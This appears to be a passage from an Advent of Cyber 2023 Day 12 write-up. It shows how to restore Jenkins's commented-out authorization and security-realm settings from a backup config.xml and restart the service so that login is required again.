![Advent of Cyber 2023 Day 12 - /var/lib/jenkins](/images/aoc2023d12_var_lib_jenkins.png)

Opening this file, we can see that attributes `authorizationStrategy` and `securityRealm` have been commented out - denoted by `<!--` and `-->` syntax:

![Advent of Cyber 2023 Day 12 - Commented Out](/images/aoc2023d12_commented_out.png)

Removing these comments, replacing `config.xml` with `config.xml.bak` and restarting Jenkins now results in the inner workings being inaccessible:

```console
$ rm config.xml
$ cp config.xml.bak config.xml
$ sudo systemctl restart jenkins
```

![Advent of Cyber 2023 Day 12 - Jenkins Sign In](/images/aoc2023d12_jenkins_sign_in.png)

